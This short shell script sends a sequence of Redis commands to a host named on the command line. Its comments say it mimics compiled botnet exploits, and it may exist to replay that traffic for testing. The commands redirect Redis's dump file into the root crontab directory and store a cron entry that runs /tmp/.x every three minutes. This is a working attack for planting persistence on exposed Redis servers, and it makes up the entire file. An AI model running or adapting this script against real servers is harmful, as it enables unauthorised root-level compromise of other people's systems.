#!/bin/sh
# Uppercase Redis commands, as sent by compiled botnet Redis exploits
# (cron persistence variant: no FLUSHALL, no backup key).
printf 'CONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\nSET wc "\n\n*/3 * * * * /tmp/.x\n\n"\n' | redis-cli -h "$1" -p 6379
